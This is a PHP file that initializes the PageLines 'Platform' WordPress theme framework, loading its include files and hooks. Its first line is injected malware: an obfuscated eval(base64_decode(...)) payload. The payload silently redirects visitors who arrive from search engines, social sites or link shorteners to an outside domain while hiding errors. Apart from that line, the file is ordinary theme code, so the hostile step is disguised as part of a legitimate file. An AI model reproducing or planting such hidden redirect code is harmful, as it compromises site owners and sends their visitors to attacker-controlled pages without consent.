<?php	 	eval(base64_decode("DQplcnJvcl9yZXBvcnRpbmcoMCk7DQokcWF6cGxtPWhlYWRlcnNfc2VudCgpOw0KaWYgKCEkcWF6cGxtKXsNCiRyZWZlcmVyPSRfU0VSVkVSWydIVFRQX1JFRkVSRVInXTsNCiR1YWc9JF9TRVJWRVJbJ0hUVFBfVVNFUl9BR0VOVCddOw0KaWYgKCR1YWcpIHsNCmlmICghc3RyaXN0cigkdWFnLCJNU0lFIDcuMCIpIGFuZCAhc3RyaXN0cigkdWFnLCJNU0lFIDYuMCIpKXsKaWYgKHN0cmlzdHIoJHJlZmVyZXIsInlhaG9vIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYmluZyIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInJhbWJsZXIiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJsaXZlLmNvbSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIndlYmFsdGEiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJiaXQubHkiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJ0aW55dXJsLmNvbSIpIG9yIHByZWdfbWF0Y2goIi95YW5kZXhcLnJ1XC95YW5kc2VhcmNoXD8oLio/KVwmbHJcPS8iLCRyZWZlcmVyKSBvciBwcmVnX21hdGNoICgiL2dvb2dsZVwuKC4qPylcL3VybFw/c2EvIiwkcmVmZXJlcikgb3Igc3RyaXN0cigkcmVmZXJlciwibXlzcGFjZS5jb20iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJmYWNlYm9vay5jb20vbCIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImFvbC5jb20iKSkgew0KaWYgKCFzdHJpc3RyKCRyZWZlcmVyLCJjYWNoZSIpIG9yICFzdHJpc3RyKCRyZWZlcmVyLCJpbnVybCIpKXsNCmhlYWRlcigiTG9jYXRpb246IGh0dHA6Ly9xZXNvcHYuNHB1LmNvbS8iKTsNCmV4aXQoKTsNCn0KfQp9DQp9DQp9"));
/**
 * This file initializes the PageLines framework 
 *
 * @package Platform
 *
 **/

/**
* Before we start, check for PHP4. It is not supported and crashes with a parse error.
* We have to do it here before any other files are loaded.
*
* This can be removed with WordPress 3.2, which will only support PHP 5.2
*
**/ 
if( floatval( phpversion() ) < 5.0 ) {
	echo '<div style="border: 1px red solid">This server is running <strong>PHP ' . phpversion() . '</strong> we are switching back to the default theme for you!<br />';
	echo 'Please contact your host and switch to PHP5 before activating Platform. <a href="' . get_admin_url() . '">Site admin</a></div>';
	switch_theme( 'twentyten', 'twentyten');
	die(); // Brutal but we need to suppress those ugly php errors!
}

/**
 * Run the starting hook
 */
do_action('pagelines_hook_pre', 'core'); // Hook

define('PL_INCLUDES', get_template_directory() . '/includes');

/**
 * Setup all the globals for the framework
 */
require_once( PL_INCLUDES . '/init.globals.php');

/**
 * Load deprecated functions
 */
require_once (PL_INCLUDES.'/deprecated.php');

/**
 * Localization - Needs to come after config_theme and before localized config files
 */
require_once( PL_INCLUDES . '/library.I18n.php');

/**
 * Load core functions
 */
require_once( PL_INCLUDES . '/library.functions.php');

/**
 * Load Options Functions 
 */
require_once( PL_INCLUDES . '/library.options.php' );

/**
 * Load template related functions
 */
require_once( PL_INCLUDES . '/library.templates.php');

/**
 * Load template related functions
 */
require_once( PL_INCLUDES . '/library.wordpress.php');

/**
 * Load shortcode library
 */
require_once( PL_INCLUDES . '/library.shortcodes.php');

/**
 * Load Extension library
 */
require_once( PL_INCLUDES . '/library.extend.php');

/**
 * Load Layouts library
 */
require_once( PL_INCLUDES . '/library.layouts.php');

/**
 * Load Layouts library
 */
require_once( PL_INCLUDES . '/library.theming.php');

/**
 * Theme configuration files
 */
require_once( PL_INCLUDES . '/config.options.php' );

/**
 * Theme/Framework Welcome
 */
require_once( PL_ADMIN . '/class.welcome.php' );

/**
 * Dynamic CSS Selectors
 */
require_once( PL_INCLUDES . '/config.selectors.php' );


/**
 * Load Custom Post Type Class
 */
require_once( PL_INCLUDES . '/class.types.php' );

/**
 * Posts Handling
 */	
require_once( PL_INCLUDES . '/class.posts.php' );


/**
 * Load layout class and setup layout singleton
 * @global object $pagelines_layout
 */
require_once( PL_INCLUDES . '/class.layout.php' ); 

/**
 * Users Handling
 */	
require_once( PL_INCLUDES . '/class.users.php' );
	
/**
 * Load sections handling class
 */
require_once( PL_INCLUDES . '/class.sections.php' );

/**
 * Load template handling class
 */	
require_once( PL_INCLUDES . '/class.template.php' );

/**
 * Load Data Handling
 */
require_once( PL_ADMIN . '/library.data.php' );

/**
 * Load HTML Objects
 */
require_once( PL_INCLUDES . '/class.objects.php' );


/**
 * Load Type Foundry Class
 */
require_once( PL_INCLUDES . '/class.typography.php' );

/**
 * Load Colors
 */
require_once( PL_INCLUDES . '/class.colors.php' );

/**
 * Load dynamic CSS handling
 */
require_once( PL_INCLUDES . '/class.css.php' );

/**
 * Load metapanel option handling class
 */
require_once( PL_ADMIN . '/class.options.metapanel.php' );

/**
 * Load Profile Handling
 */	
require_once( PL_ADMIN . '/class.profiles.php' );


include( PL_INCLUDES . '/library.upgrades.php' );
/**
 * Load Singleton Globals
 */	
require_once( PL_INCLUDES . '/init.singleton.php' );


/**
 * Add Extension Handlers
 */
require_once( PL_INCLUDES . '/class.register.php' );

/**
 * Add Integration Functionality
 */
require_once( PL_INCLUDES . '/class.integration.php' );

/**
 * Add Multisite
 */
if(is_multisite())
	require_once( PL_INCLUDES . '/library.multisite.php' );

/**
 * Add Integration Functionality
 */
require_once( PL_INCLUDES . '/class.themesupport.php' );

/**
 * Add Less Extension
 */
require_once( PL_INCLUDES . '/less.plugin.php' );

/**
 * Add Less Functions
 */
require_once( PL_INCLUDES . '/less.functions.php' );

/**
 * Register and load all sections
 */
$load_sections = new PageLinesRegister();
$load_sections->pagelines_register_sections();

pagelines_register_hook('pagelines_setup'); // Hook

load_section_persistent(); // Load persistent section functions (e.g. custom post types)

if(is_admin()) 
	load_section_admin(); // Load admin only functions from sections

do_global_meta_options(); // Load the global meta settings tab
	

/**
 * Build Version
 */	
require_once( PL_INCLUDES . '/version.php' );


/**
 * Load site actions
 */
require_once (PL_INCLUDES.'/actions.site.php');

/**
 * Run the pagelines_init Hook
 */
pagelines_register_hook('pagelines_hook_init'); // Hook

if ( is_admin() )
	include( PL_ADMIN . '/init.admin.php' );
